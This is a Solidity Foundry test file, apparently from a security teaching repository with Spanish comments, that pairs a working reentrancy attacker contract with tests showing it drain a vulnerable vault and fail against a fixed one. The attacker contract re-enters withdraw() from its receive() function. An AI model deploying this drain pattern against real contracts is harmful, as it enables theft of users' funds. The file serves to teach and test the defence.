// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {VulnerableReentrancy, FixedReentrancy} from "../contracts/01-Reentrancy.sol";

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

// Reingresa a withdraw() desde receive() mientras el saldo aun no se ha puesto a cero.
contract ReentrancyAttacker {
    IBank public bank;

    constructor(IBank b) {
        bank = b;
    }

    function pwn() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdraw();
    }
}

contract ReentrancyTest is Test {
    function test_exploit_drenaElVaultVulnerable() public {
        vm.deal(address(this), 100 ether);
        VulnerableReentrancy bank = new VulnerableReentrancy();
        bank.deposit{value: 3 ether}(); // fondos de otras "victimas"

        ReentrancyAttacker att = new ReentrancyAttacker(IBank(address(bank)));
        vm.deal(address(att), 1 ether);
        att.pwn();

        assertGt(address(att).balance, 1 ether, "el atacante debe salir con ganancia");
        assertEq(address(bank).balance, 0, "el vault vulnerable queda vaciado");
    }

    function test_fixed_resisteLaReentrancia() public {
        vm.deal(address(this), 100 ether);
        FixedReentrancy bank = new FixedReentrancy();
        bank.deposit{value: 3 ether}();

        ReentrancyAttacker att = new ReentrancyAttacker(IBank(address(bank)));
        vm.deal(address(att), 1 ether);

        vm.expectRevert();
        att.pwn();

        assertEq(address(bank).balance, 3 ether, "el vault seguro conserva los fondos");
    }

    receive() external payable {}
}
